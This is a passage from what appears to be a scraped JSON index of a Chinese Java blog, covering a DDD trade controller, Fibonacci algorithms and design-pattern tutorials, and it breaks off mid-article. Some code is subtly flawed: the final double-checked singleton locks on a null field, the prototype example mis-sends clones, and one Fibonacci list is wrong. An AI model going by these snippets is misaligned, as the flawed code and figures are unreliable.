1234567891011121314151617181920212223242526272829@RequestMapping(&quot;/trade&quot;)@RestControllerpublic class TradeController { @Autowired private TradeManager tradeManager; @Autowired private TradeRepository tradeRepository; @PostMapping(path = &quot;/recharge&quot;) public TradeDTO recharge(@RequestBody TradeDTO tradeDTO) { return TradeDTO.toDto(tradeManager.recharge(tradeDTO.toEntity())); } @PostMapping(path = &quot;/consume&quot;) public TradeDTO consume(@RequestBody TradeDTO tradeDTO) { return TradeDTO.toDto(tradeManager.consume(tradeDTO.toEntity())); } @GetMapping(path = &quot;/{tradeNumber}&quot;) public TradeDTO findByTradeNumber(@PathVariable(&quot;tradeNumber&quot;) String tradeNumber){ return TradeDTO.toDto(tradeRepository.findByTradeNumber(tradeNumber)); } } 用户接口层面向终端提供服务支持 可根据不同的场景单独一个模块，面向 Web 提供 http restful，面向服务间 API 调用提供 RPG 支持 为 Web 端提供身份认证和权限验证服务，VO 数据转换 为 API 端提供限流和熔断服务，DTO 数据转换 将数据转换从应用层提到用户接口层更方便不同场景之前的需求变化，同时也保证应用层数据格式的统一性 # 7. 复杂数据查询 以上可见并没有涉及复杂数据查询问题，此问题不涉及业务逻辑处理所以不应该放在领域层处理。 如果复杂数据查询需求较多可采用 CQRS 模式，将查询单独一个模块处理。如果较少可由基础设施层做数据查询，应用层做数据封装，用户接口层做数据调用 JPA 不太适合做多表关联的数据库查询操作，可使用其它的灵活性较高的 ORM 架构 在大数据大并发情况下，多表关联会严重影响数据库性能，可以考虑做宽表查询 # 三、综述 DDD 分层主要解决各层之间耦合度问题，做到各层各施其职互不影响。各层中领域层的设计是整个系统的中枢，最能体现领域驱动设计的核心思想。它的良好设计是保证往后架构的可持续性，可维护性。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/06/24/%E3%80%90%E6%9E%B6%E6%9E%84%E3%80%91DDD%E5%88%86%E5%B1%82%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%9E%8B/"},{"title":"【算法】使用Java实现斐波那契数列的三种方法，太酷啦","text":"# 【算法】使用 Java 实现斐波那契数列的三种方法，太酷啦 # Java 实现斐波那契数列的三种方法 什么是斐波那契数列 这里借用一下度娘的一段话：斐波那契数列（Fibonacci sequence），又称黄金分割数列、因数学家列昂纳多・斐波那契（Leonardoda Fibonacci）以兔子繁殖为例子而引入，故又称为 “兔子数列”，指的是这样一个数列：1、1、2、3、5、8、13、21、34、…… 其规律很明显，从第 3 个数开始，每个数都等于它前两个数的和。 那么通过 java 可以如何实现斐波那契数列呢？这里介绍三种方法。 通过代码实现以下效果：当你输入 n 时，会获取斐波那契数列的第 n 个数的值。 # 1.for 循环实现 123456789101112131415public static int fibonacci(int n) { if (n &lt;= 1) { return n; } int[] fib = new int[n+1]; fib[0] = 0; fib[1] = 1; for (int i = 2; i &lt;= n; i++) { fib[i] = fib[i-1] + fib[i-2]; } return fib[n];} # 2. 平方根实现 1234public static int fibonacci(int n) { double goldenRatio = (1 + Math.sqrt(5)) / 2; return (int) Math.round(Math.pow(goldenRatio, n) / Math.sqrt(5));} # 3. 矩阵快速幂实现 123456789101112131415161718192021222324252627282930313233343536373839public static int fibonacci(int n) { if (n &lt;= 1) { return n; } int[][] base = {{1, 1}, {1, 0}}; int[][] result = pow(base, n - 1); return result[0][0];}private static int[][] pow(int[][] base, int power) { int[][] result = new int[base.length][base.length]; for (int i = 0; i &lt; base.length; i++) { result[i][i] = 1; } while (power &gt; 0) { if (power % 2 == 1) { result = multiply(result, base); } base = multiply(base, base); power /= 2; } return result;}private static int[][] multiply(int[][] a, int[][] b) { int[][] c = new int[a.length][b[0].length]; for (int i = 0; i &lt; a.length; i++) { for (int j = 0; j &lt; b[0].length; j++) { for (int k = 0; k &lt; b.length; k++) { c[i][j] += a[i][k] * b[k][j]; } } } return c;} OK，到这里 java 实现斐波那契数列的三种写法就全部写完了，如果大家还有其他方法，欢迎交流～ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/26/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E4%BD%BF%E7%94%A8Java%E5%AE%9E%E7%8E%B0%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%8C%E5%A4%AA%E9%85%B7%E5%95%A6/"},{"title":"【算法】斐波那契数列的概念","text":"# 【算法】斐波那契数列的概念 # 斐波那契数列的概念 ​ 斐波那契数列（Fibonacci sequence），又称黄金分割数列，因数学家莱昂纳多・斐波那契（Leonardoda Fibonacci）以兔子繁殖为例子而引入，故又称为 “兔子数列”。 ​ 斐波那契数列指的是这样一个数列： ​ 0，1，1，2，3，5，8，13，21，34，55，89，144，233，377，610，987，1597，2584，4181，6765，10946，17711…… ​ 它的规律是：这个数列从第 3 项开始，每一项都等于前两项之和。 ​ 在数学上，斐波那契数列以如下被以递推的方法定义：F*(0)=0，*F*(1)=1, *F*(n)=*F*(n - 1)+*F*(n - 2)（*n* ≥ 2，*n* ∈ N*），显然，斐波那契数列是一个线性递推数列 *。 # 斐波那契数列的实现 ​ 常用的实现斐波那契数列的方法分为两大类：递归和循环。 # 1. 递归实现 123456789101112131415161718192021#include &lt;stdio.h&gt;int F(int n) //斐波那契数列函数 递归形式{ if(n == 0) //初始化 return 0; if(n == 1 || n == 2) return 1; return F(n-1) + F(n-2); //如果n != 1 &amp;&amp; n != 2 进行递归运算} int main(){ int t,n; scanf(&quot;%d&quot;,&amp;t); while(t--) { scanf(&quot;%d&quot;,&amp;n); printf(&quot;%d\\n&quot;, F(n)); } return 0;} # 2. 迭代实现（优先使用） # 6091: 斐波那契数列 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;int fibonacci(int n) //定义斐波那契函数{ if(n == 0) //定义初始值 return 0; if(n == 1 || n == 2) return 1; int a=1,b=1,c=0; //定义初始值//用一个for循环，a、b分别为前两项，c为前两项之和，得到c后进行交换更新a、b的值，进行n次交换即可。 for(int i=3;i&lt;=n;i++) //更新操作 { c = a+b; a = b; b = c; } return c; //c即为结果输出} int main(){ int t,n; scanf(&quot;%d&quot;,&amp;t); while(t--) { scanf(&quot;%d&quot;,&amp;n); printf(&quot;%d\\n&quot;, fibonacci(n)); } return 0;} ​ 递归和迭代的改进算法可以参考 ** 微 光的斐波那契数列 **。 ​ 因为递归算法存在着大量的重复计算，在 N 趋近于较大值时，可能会造成内存溢出或超时的情况，又因为使用迭代算法的情况下同样可以实现计算斐波那契数列第 N 项的功能，所以在 N 值很大时我们优先使用迭代算法。 # 斐波那契数列的应用 10 个连续的斐波那契数的和 = 第 7 个数的 11 倍 前 n 项和 = 第 n + 2 项 - 第 2 项 从第 2 项开始，第 2n - 1 项的平方比 2n * (2n - 2) 多 1；第 2n 项的平方比 2n * (2n - 2) 少 1。 # 1**. 黄金分割 ** ** 黄金分割：** 把任一线段分割成两段，使 大段 / 全段 = 小段 / 大段， 比值经过计算之后，就是黄金分割比。 ​ 斐波那契数列：随着数列项数的增加，前一项与后一项之比越来越逼近 ** 黄金分割 * 的数值 0.6180339887……*** ​ 卢卡斯数列：斐波那契数列的推广形式，卢卡斯数列的形式为：1， 3， 4， 7， 11， 18，29，47…… 卢卡斯数列的相邻两项比值的极限恰好也是二分之根号五减一，即黄金分割比。所以说，卢卡斯抓住了斐波那契数列的本质。 12345678910111213#include&lt;stdio.h&gt;int main(){ double f[100]; f[1]=1, f[2]=1; for(int i=3; i&lt;=50; i++) { f[i]=f[i-1]+f[i-2]; } int n; scanf(&quot;%d&quot;,&amp;n); printf(&quot;%.10lf\\n&quot;,f[n]/f[n+1]); } # 2. 杨辉三角 ​ 如图所示作 45 度斜线，之后做直线的平行线，将每条直线所经过的数，即得之和即为斐波那契数列。 # 3. 兔子数列 ​ * 斐波那契数列又因数学家 * 列昂纳多・斐波那契 * 以兔子繁殖为例子而引入，故又称为 “* 兔子数列 *”。*** ​ **** 兔子数列是指：**** 一般而言，兔子在出生两个月后，就有繁殖能力，一对兔子每个月能生出一对小兔子来。如果所有兔子都不死，那么一年以后可以繁殖多少对兔子？ ​ 很容易发现 “兔子数列” 问题和斐波那契数列问题相同，都是一样的解法。 # 1376: 母牛的故事 123456789101112131415161718#include&lt;stdio.h&gt; void DataInit(int *a){ for(int i = 4; i &lt; 55; i++) a[i] = a[i-1] + a[i-3];}int main(){ int a[55] = {0, 1, 2, 3}; int n; DataInit(a); while(scanf(&quot;%d&quot;, &amp;n)!=EOF) if(n) printf(&quot;%ld\\n&quot;, a[n]); else break; return 0;} # 4. 排列组合 ​ 有一段楼梯，有 10 级台阶，规定每一步只能跨一级或两级，要登上第 10 级台阶有几种不同的走法？ ​ 这也是一个斐波那契数列： ​ 登第一级台阶，有一种走法，0-&gt;1； ​ 登第二级台阶，有两种走法，0-&gt;1-&gt;2，0-&gt;2； ​ 登第三级台阶，有三种走法，0-&gt;1-&gt;2-&gt;3，0-&gt;1-&gt;3，0-&gt;2-&gt;3； ​ 登第四级台阶，有五种走法，0-&gt;1-&gt;2-&gt;3-&gt;4，0-&gt;1-&gt;2-&gt;4，0-&gt;1-&gt;3-&gt;4，0-&gt;2-&gt;3-&gt;4，0-&gt;2-&gt;4； ​ … ​ 即 1， 2， 3， 5， 8， 13，… 到 10 级，就是 89 种走法，与斐波那契数列的规律契合。 ​ 类似的斐波那契数列的规律运用还有很多。 ​ （1， 1， 2， 3， 5， 8， 13， 21， 33， 54， 89…） # 5. 矩形面积 ​ 右下图可知，斐波那契数列与矩形面积的生成相关。 ​ ​ 不难发现一个规律，即 ** 生成的矩形中，所有小正方形的面积之和等于大矩形的面积。** 即： # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/26/%E3%80%90%E7%AE%97%E6%B3%95%E3%80%91%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%E7%9A%84%E6%A6%82%E5%BF%B5/"},{"title":"【设计模式】23 种设计模式详解（全23种）","text":"# 【设计模式】23 种设计模式详解（全 23 种） # 设计模式的分类 总体来说设计模式分为三大类： 创建型模式，共五种：工厂方法模式、抽象工厂模式、单例模式、建造者模式、原型模式。 结构型模式，共七种：适配器模式、装饰器模式、代理模式、外观模式、桥接模式、组合模式、享元模式。 行为型模式，共十一种：策略模式、模板方法模式、观察者模式、迭代子模式、责任链模式、命令模式、备忘录模式、状态模式、访问者模式、中介者模式、解释器模式。 # # A、创建模式（5 种） 工厂方法模式、抽象工厂模式、单例模式、建造者模式、原型模式。 # 1 工厂模式 # 1.1 简单工厂模式 ** 定义：** 定义了一个创建对象的类，由这个类来封装实例化对象的行为。 举例：（我们举一个 pizza 工厂的例子） pizza 工厂一共生产三种类型的 pizza：chesse,pepper,greak。通过工厂类（SimplePizzaFactory）实例化这三种类型的对象。类图如下： 工厂类的代码： 12345678910111213public class SimplePizzaFactory { public Pizza CreatePizza(String ordertype) { Pizza pizza = null; if (ordertype.equals(&quot;cheese&quot;)) { pizza = new CheesePizza(); } else if (ordertype.equals(&quot;greek&quot;)) { pizza = new GreekPizza(); } else if (ordertype.equals(&quot;pepper&quot;)) { pizza = new PepperPizza(); } return pizza; }} 简单工厂存在的问题与解决方法： 简单工厂模式有一个问题就是，类的创建依赖工厂类，也就是说，如果想要拓展程序，必须对工厂类进行修改，这违背了开闭原则，所以，从设计角度考虑，有一定的问题，如何解决？我们可以定义一个创建对象的抽象方法并创建多个不同的工厂类实现该抽象方法，这样一旦需要增加新的功能，直接增加新的工厂类就可以了，不需要修改之前的代码。这种方法也就是我们接下来要说的工厂方法模式。 # 1.2 工厂方法模式 ** 定义：** 定义了一个创建对象的抽象方法，由子类决定要实例化的类。工厂方法模式将对象的实例化推迟到子类。 举例：（我们依然举 pizza 工厂的例子，不过这个例子中，pizza 产地有两个：伦敦和纽约）。添加了一个新的产地，如果用简单工厂模式的的话，我们要去修改工厂代码，并且会增加一堆的 if else 语句。而工厂方法模式克服了简单工厂要修改代码的缺点，它会直接创建两个工厂，纽约工厂和伦敦工厂。类图如下： OrderPizza 中有个抽象的方法： 1abstract Pizza createPizza(); 两个工厂类继承 OrderPizza 并实现抽象方法： 1234567891011121314151617181920212223242526public class LDOrderPizza extends OrderPizza { Pizza createPizza(String ordertype) { Pizza pizza = null; if (ordertype.equals(&quot;cheese&quot;)) { pizza = new LDCheesePizza(); } else if (ordertype.equals(&quot;pepper&quot;)) { pizza = new LDPepperPizza(); } return pizza; }}public class NYOrderPizza extends OrderPizza { Pizza createPizza(String ordertype) { Pizza pizza = null; if (ordertype.equals(&quot;cheese&quot;)) { pizza = new NYCheesePizza(); } else if (ordertype.equals(&quot;pepper&quot;)) { pizza = new NYPepperPizza(); } return pizza; }} 、通过不同的工厂会得到不同的实例化的对象，PizzaStroe 的代码如下： 123456public class PizzaStroe { public static void main(String[] args) { OrderPizza mOrderPizza; mOrderPizza = new NYOrderPizza(); }} ** 解决了简单工厂模式的问题：** 增加一个新的 pizza 产地（北京），只要增加一个 BJOrderPizza 类： 1234567891011public class BJOrderPizza extends OrderPizza { Pizza createPizza(String ordertype) { Pizza pizza = null; if (ordertype.equals(&quot;cheese&quot;)) { pizza = new LDCheesePizza(); } else if (ordertype.equals(&quot;pepper&quot;)) { pizza = new LDPepperPizza(); } return pizza; }} 其实这个模式的好处就是，如果你现在想增加一个功能，只需做一个实现类就 OK 了，无需去改动现成的代码。这样做，拓展性较好！ ** 工厂方法存在的问题与解决方法：** 客户端需要创建类的具体的实例。简单来说就是用户要订纽约工厂的披萨，他必须去纽约工厂，想订伦敦工厂的披萨，必须去伦敦工厂。 当伦敦工厂和纽约工厂发生变化了，用户也要跟着变化，这无疑就增加了用户的操作复杂性。为了解决这一问题，我们可以把工厂类抽象为接口，用户只需要去找默认的工厂提出自己的需求（传入参数），便能得到自己想要产品，而不用根据产品去寻找不同的工厂，方便用户操作。这也就是我们接下来要说的抽象工厂模式。 # 1.3 抽象工厂模式 ** 定义：** 定义了一个接口用于创建相关或有依赖关系的对象族，而无需明确指定具体类。 举例：（我们依然举 pizza 工厂的例子，pizza 工厂有两个：纽约工厂和伦敦工厂）。类图如下： 工厂的接口： 123public interface AbsFactory { Pizza CreatePizza(String ordertype) ;} 工厂的实现： 123456789101112public class LDFactory implements AbsFactory { @Override public Pizza CreatePizza(String ordertype) { Pizza pizza = null; if (&quot;cheese&quot;.equals(ordertype)) { pizza = new LDCheesePizza(); } else if (&quot;pepper&quot;.equals(ordertype)) { pizza = new LDPepperPizza(); } return pizza; }} PizzaStroe 的代码如下： 123456public class PizzaStroe { public static void main(String[] args) { OrderPizza mOrderPizza; mOrderPizza = new OrderPizza(&quot;London&quot;); }} ** 解决了工厂方法模式的问题：** 在抽象工厂中 PizzaStroe 中只需要传入参数就可以实例化对象。 # 1.4 工厂模式适用的场合 大量的产品需要创建，并且这些产品具有共同的接口 。 # 1.5 三种工厂模式的使用选择 简单工厂 ： 用来生产同一等级结构中的任意产品。（不支持拓展增加产品） 工厂方法 ：用来生产同一等级结构中的固定产品。（支持拓展增加产品） 抽象工厂 ：用来生产不同产品族的全部产品。（支持拓展增加产品；支持增加产品族） ** 简单工厂的适用场合：** 只有伦敦工厂（只有这一个等级），并且这个工厂只生产三种类型的 pizza：chesse,pepper,greak（固定产品）。 工厂方法的适用场合：现在不光有伦敦工厂，还增设了纽约工厂（仍然是同一等级结构，但是支持了产品的拓展），这两个工厂依然只生产三种类型的 pizza：chesse,pepper,greak（固定产品）。 ** 抽象工厂的适用场合：** 不光增设了纽约工厂（仍然是同一等级结构，但是支持了产品的拓展），这两个工厂还增加了一种新的类型的 pizza：chinese pizza（增加产品族）。 ** 所以说抽象工厂就像工厂，而工厂方法则像是工厂的一种产品生产线。因此，我们可以用抽象工厂模式创建工厂，而用工厂方法模式创建生产线。比如，我们可以使用抽象工厂模式创建伦敦工厂和纽约工厂，使用工厂方法实现 cheese pizza 和 greak pizza 的生产。类图如下： ** 总结一下三种模式： 简单工厂模式就是建立一个实例化对象的类，在该类中对多个对象实例化。工厂方法模式是定义了一个创建对象的抽象方法，由子类决定要实例化的类。这样做的好处是再有新的类型的对象需要实例化只要增加子类即可。抽象工厂模式定义了一个接口用于创建对象族，而无需明确指定具体类。抽象工厂也是把对象的实例化交给了子类，即支持拓展。同时提供给客户端接口，避免了用户直接操作子类工厂。 # # 2 单例模式 ** 定义：** 确保一个类最多只有一个实例，并提供一个全局访问点 单例模式可以分为两种：预加载和懒加载 # 2.1 预加载 顾名思义，就是预先加载。再进一步解释就是还没有使用该单例对象，但是，该单例对象就已经被加载到内存了。 123456789101112public class PreloadSingleton { public static PreloadSingleton instance = new PreloadSingleton(); //其他的类无法实例化单例类的对象 private PreloadSingleton() { }; public static PreloadSingleton getInstance() { return instance; }} 很明显，没有使用该单例对象，该对象就被加载到了内存，会造成内存的浪费。 # 2.2 懒加载 为了避免内存的浪费，我们可以采用懒加载，即用到该单例对象的时候再创建。 1234567891011121314151617public class Singleton { private static Singleton instance=null; private Singleton(){ }; public static Singleton getInstance() { if(instance==null) { instance=new Singleton(); } return instance; }} # 2.3 单例模式和线程安全 （1）预加载只有一条语句 return instance, 这显然可以保证线程安全。但是，我们知道预加载会造成内存的浪费。 （2）懒加载不浪费内存，但是无法保证线程的安全。首先，if 判断以及其内存执行代码是非原子性的。其次，new Singleton () 无法保证执行的顺序性。 不满足原子性或者顺序性，线程肯定是不安全的，这是基本的常识，不再赘述。我主要讲一下为什么 new Singleton () 无法保证顺序性。我们知道创建一个对象分三步: 12345memory=allocate();//1:初始化内存空间ctorInstance(memory);//2:初始化对象instance=memory();//3:设置instance指向刚分配的内存地址 **jvm 为了提高程序执行性能，会对没有依赖关系的代码进行重排序，上面 2 和 3 行代码可能被重新排序。** 我们用两个线程来说明线程是不安全的。线程 A 和线程 B 都创建对象。其中，A2 和 A3 的重排序，将导致线程 B 在 B1 处判断出 instance 不为空，线程 B 接下来将访问 instance 引用的对象。此时，线程 B 将会访问到一个还未初始化的对象（线程不安全）。 # 2.4 保证懒加载的线程安全 我们首先想到的就是使用synchronized关键字。synchronized加载 getInstace () 函数上确实保证了线程的安全。但是，如果要经常的调用getInstance () 方法，不管有没有初始化实例，都会唤醒和阻塞线程。为了避免线程的上下文切换消耗大量时间，如果对象已经实例化了，我们没有必要再使用synchronized加锁，直接返回对象。 1234567891011public class Singleton { private static Singleton instance = null; private Singleton() { }; public static synchronized Singleton getInstance() { if (instance == null) { instance = new Singleton(); } return instance; }} 我们把sychronized加在 if (instance==null) 判断语句里面，保证 instance 未实例化的时候才加锁 123456789101112131415public class Singleton { private static Singleton instance = null; private Singleton() { }; public static synchronized Singleton getInstance() { if (instance == null) { synchronized (Singleton.class) { if (instance == null) { instance = new Singleton(); } } } return instance; }} 我们经过 2.3 的讨论知道 new 一个对象的代码是无法保证顺序性的，因此，我们需要使用另一个关键字volatile保证对象实例化过程的顺序性。 123456789101112131415public class Singleton { private static volatile Singleton instance = null; private Singleton() { }; public static synchronized Singleton getInstance() { if (instance == null) { synchronized (instance) { if (instance == null) { instance = new Singleton(); } } } return instance; }} 到此，我们就保证了懒加载的线程安全。 # 3 生成器模式 ** 定义：** 封装一个复杂对象构造过程，并允许按步骤构造。 定义解释： 我们可以将生成器模式理解为，假设我们有一个对象需要建立，这个对象是由多个组件（Component）组合而成，每个组件的建立都比较复杂，但运用组件来建立所需的对象非常简单，所以我们就可以将构建复杂组件的步骤与运用组件构建对象分离，使用 builder 模式可以建立。 # 3.1 模式的结构和代码示例 生成器模式结构中包括四种角色： （1）产品 (Product)：具体生产器要构造的复杂对象； （2）抽象生成器 (Bulider)：抽象生成器是一个接口，该接口除了为创建一个 Product 对象的各个组件定义了若干个方法之外，还要定义返回 Product 对象的方法（定义构造步骤）； （3）具体生产器 (ConcreteBuilder)：实现 Builder 接口的类，具体生成器将实现 Builder 接口所定义的方法（生产各个组件）； （4）指挥者 (Director)：指挥者是一个类，该类需要含有 Builder 接口声明的变量。指挥者的职责是负责向用户提供具体生成器，即指挥者将请求具体生成器类来构造用户所需要的 Product 对象，如果所请求的具体生成器成功地构造出 Product 对象，指挥者就可以让该具体生产器返回所构造的 Product 对象。（按照步骤组装部件，并返回 Product） 举例（我们如果构建生成一台电脑，那么我们可能需要这么几个步骤（1）需要一个主机（2）需要一个显示器（3）需要一个键盘（4）需要一个鼠标） 虽然我们具体在构建一台主机的时候，每个对象的实际步骤是不一样的，比如，有的对象构建了 i7cpu 的主机，有的对象构建了 i5cpu 的主机，有的对象构建了普通键盘，有的对象构建了机械键盘等。但不管怎样，你总是需要经过一个步骤就是构建一台主机，一台键盘。对于这个例子，我们就可以使用生成器模式来生成一台电脑，他需要通过多个步骤来生成。类图如下： ComputerBuilder 类定义构造步骤： 123456789101112131415161718public abstract class ComputerBuilder { protected Computer computer; public Computer getComputer() { return computer; } public void buildComputer() { computer = new Computer(); System.out.println(&quot;生成了一台电脑！！！&quot;); } public abstract void buildMaster(); public abstract void buildScreen(); public abstract void buildKeyboard(); public abstract void buildMouse(); public abstract void buildAudio();} HPComputerBuilder 定义各个组件： 1234567891011121314151617181920212223242526272829303132public class HPComputerBuilder extends ComputerBuilder { @Override public void buildMaster() { // TODO Auto-generated method stub computer.setMaster(&quot;i7,16g,512SSD,1060&quot;); System.out.println(&quot;(i7,16g,512SSD,1060)的惠普主机&quot;); } @Override public void buildScreen() { // TODO Auto-generated method stub computer.setScreen(&quot;1080p&quot;); System.out.println(&quot;(1080p)的惠普显示屏&quot;); } @Override public void buildKeyboard() { // TODO Auto-generated method stub computer.setKeyboard(&quot;cherry 青轴机械键盘&quot;); System.out.println(&quot;(cherry 青轴机械键盘)的键盘&quot;); } @Override public void buildMouse() { // TODO Auto-generated method stub computer.setMouse(&quot;MI 鼠标&quot;); System.out.println(&quot;(MI 鼠标)的鼠标&quot;); } @Override public void buildAudio() { // TODO Auto-generated method stub computer.setAudio(&quot;飞利浦 音响&quot;); System.out.println(&quot;(飞利浦 音响)的音响&quot;); }} Director 类对组件进行组装并生成产品 1234567891011121314151617181920public class Director { private ComputerBuilder computerBuilder; public void setComputerBuilder(ComputerBuilder computerBuilder) { this.computerBuilder = computerBuilder; } public Computer getComputer() { return computerBuilder.getComputer(); } public void constructComputer() { computerBuilder.buildComputer(); computerBuilder.buildMaster(); computerBuilder.buildScreen(); computerBuilder.buildKeyboard(); computerBuilder.buildMouse(); computerBuilder.buildAudio(); }} # 3.2 生成器模式的优缺点 # 优点 将一个对象分解为各个组件 将对象组件的构造封装起来 可以控制整个对象的生成过程 # 缺点 对不同类型的对象需要实现不同的具体构造器的类，这可能回答大大增加类的数量 # 3.3 生成器模式与工厂模式的不同 生成器模式构建对象的时候，对象通常构建的过程中需要多个步骤，就像我们例子中的先有主机，再有显示屏，再有鼠标等等，生成器模式的作用就是将这些复杂的构建过程封装起来。工厂模式构建对象的时候通常就只有一个步骤，调用一个工厂方法就可以生成一个对象。 # 4 原型模式 ** 定义：** 通过复制现有实例来创建新的实例，无需知道相应类的信息。 简单地理解，其实就是当需要创建一个指定的对象时，我们刚好有一个这样的对象，但是又不能直接使用，我会 clone 一个一毛一样的新对象来使用；基本上这就是原型模式。关键字：Clone。 # 4.1 深拷贝和浅拷贝 浅复制：将一个对象复制后，基本数据类型的变量都会重新创建，而引用类型，指向的还是原对象所指向的。 深复制：将一个对象复制后，不论是基本数据类型还有引用类型，都是重新创建的。简单来说，就是深复制进行了完全彻底的复制，而浅复制不彻底。clone 明显是深复制，clone 出来的对象是是不能去影响原型对象的 # 4.2 原型模式的结构和代码示例 Client：使用者 Prototype：接口（抽象类），声明具备 clone 能力，例如 java 中得 Cloneable 接口 ConcretePrototype：具体的原型类 可以看出设计模式还是比较简单的，重点在于 Prototype 接口和 Prototype 接口的实现类 ConcretePrototype。原型模式的具体实现：一个原型类，只需要实现 Cloneable 接口，覆写 clone 方法，此处 clone 方法可以改成任意的名称，因为 Cloneable 接口是个空接口，你可以任意定义实现类的方法名，如 cloneA 或者 cloneB，因为此处的重点是 super.clone () 这句话，super.clone () 调用的是 Object 的 clone () 方法。 123456public class Prototype implements Cloneable { public Object clone() throws CloneNotSupportedException { Prototype proto = (Prototype) super.clone(); return proto; } } ** 举例（银行发送大量邮件，使用 clone 和不使用 clone 的时间对比）：** 我们模拟创建一个对象需要耗费比较长的时间，因此，在构造函数中我们让当前线程 sleep 一会 12345678910public Mail(EventTemplate et) { this.tail = et.geteventContent(); this.subject = et.geteventSubject(); try { Thread.sleep(1000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } } 不使用 clone, 发送十个邮件 1234567891011121314151617public static void main(String[] args) { int i = 0; int MAX_COUNT = 10; EventTemplate et = new EventTemplate(&quot;9月份信用卡账单&quot;, &quot;国庆抽奖活动...&quot;); long start = System.currentTimeMillis(); while (i &lt; MAX_COUNT) { // 以下是每封邮件不同的地方 Mail mail = new Mail(et); mail.setContent(getRandString(5) + &quot;,先生（女士）:你的信用卡账单...&quot; + mail.getTail()); mail.setReceiver(getRandString(5) + &quot;@&quot; + getRandString(8) + &quot;.com&quot;); // 然后发送邮件 sendMail(mail); i++; } long end = System.currentTimeMillis(); System.out.println(&quot;用时:&quot; + (end - start)); } 用时：10001 使用 clone, 发送十个邮件 1234567891011121314151617public static void main(String[] args) { int i = 0; int MAX_COUNT = 10; EventTemplate et = new EventTemplate(&quot;9月份信用卡账单&quot;, &quot;国庆抽奖活动...&quot;); long start=System.currentTimeMillis(); Mail mail = new Mail(et); while (i &lt; MAX_COUNT) { Mail cloneMail = mail.clone(); mail.setContent(getRandString(5) + &quot;,先生（女士）:你的信用卡账单...&quot; + mail.getTail()); mail.setReceiver(getRandString(5) + &quot;@&quot; + getRandString(8) + &quot;.com&quot;); sendMail(cloneMail); i++; } long end=System.currentTimeMillis(); System.out.println(&quot;用时:&quot;+(end-start)); } 用时：1001 # 4.3 总结 原型模式的本质就是 clone，可以解决构建复杂对象的资源消耗问题，能再某些场景中提升构建对象的效率；还有一个重要的用途就是保护性拷贝，可以通过返回一个拷贝对象的形式，实现只读的限制。 # B、结构模式（7 种） 适配器模式、装饰器模式、代理模式、外观模式、桥接模式、组合模式、享元模式。 # # 5 适配器模式 定义： 适配器模式将某个类的接口转换成客户端期望的另一个接口表示，目的是消除由于接口不匹配所造成的类的兼容性问题。 ** 主要分为三类：** 类的适配器模式、对象的适配器模式、接口的适配器模式。 # 5.1 类适配器模式 通过多重继承目标接口和被适配者类方式来实现适配 举例 (将 USB 接口转为 VGA 接口)，类图如下： USBImpl 的代码： 1234567public class USBImpl implements USB{ @Override public void showPPT() { // TODO Auto-generated method stub System.out.println(&quot;PPT内容演示&quot;); }} AdatperUSB2VGA 首先继承 USBImpl 获取 USB 的功能，其次，实现 VGA 接口，表示该类的类型为 VGA。 123456public class AdapterUSB2VGA extends USBImpl implements VGA { @Override public void projection() { super.showPPT(); }} Projector 将 USB 映射为 VGA，只有 VGA 接口才可以连接上投影仪进行投影 123456789101112public class Projector&lt;T&gt; { public void projection(T t) { if (t instanceof VGA) { System.out.println(&quot;开始投影&quot;); VGA v = new VGAImpl(); v = (VGA) t; v.projection(); } else { System.out.println(&quot;接口不匹配，无法投影&quot;); } }} test 代码 12345678@Testpublic void test2(){ //通过适配器创建一个VGA对象，这个适配器实际是使用的是USB的showPPT（）方法 VGA a=new AdapterUSB2VGA(); //进行投影 Projector p1=new Projector(); p1.projection(a);} # 5.2 对象适配器模式 对象适配器和类适配器使用了不同的方法实现适配，对象适配器使用组合，类适配器使用继承。 举例 (将 USB 接口转为 VGA 接口)，类图如下： 1234567public class AdapterUSB2VGA implements VGA { USB u = new USBImpl(); @Override public void projection() { u.showPPT(); }} 实现 VGA 接口，表示适配器类是 VGA 类型的，适配器方法中直接使用 USB 对象。 # 5.3 接口适配器模式 当不需要全部实现接口提供的方法时，可先设计一个抽象类实现接口，并为该接口中每个方法提供一个默认实现（空方法），那么该抽象类的子类可有选择地覆盖父类的某些方法来实现需求，它适用于一个接口不想使用其所有的方法的情况。 举例 (将 USB 接口转为 VGA 接口，VGA 中的 b () 和 c () 不会被实现)，类图如下： AdapterUSB2VGA抽象类 12345678910111213public abstract class AdapterUSB2VGA implements VGA { USB u = new USBImpl(); @Override public void projection() { u.showPPT(); } @Override public void b() { }; @Override public void c() { };} AdapterUSB2VGA 实现，不用去实现 b () 和 c () 方法。 12345public class AdapterUSB2VGAImpl extends AdapterUSB2VGA { public void projection() { super.projection(); }} # 5.4 总结 总结一下三种适配器模式的应用场景： 类适配器模式：当希望将一个类转换成满足另一个新接口的类时，可以使用类的适配器模式，创建一个新类，继承原有的类，实现新的接口即可。 ** 对象适配器模式：** 当希望将一个对象转换成满足另一个新接口的对象时，可以创建一个 Wrapper 类，持有原类的一个实例，在 Wrapper 类的方法中，调用实例的方法就行。 ** 接口适配器模式：** 当不希望实现一个接口中所有的方法时，可以创建一个抽象类 Wrapper，实现所有方法，我们写别的类的时候，继承抽象类即可。 命名规则： 我个人理解，三种命名方式，是根据 src 是以怎样的形式给到 Adapter（在 Adapter 里的形式）来命名的。 类适配器，以类给到，在 Adapter 里，就是将 src 当做类，继承， 对象适配器，以对象给到，在 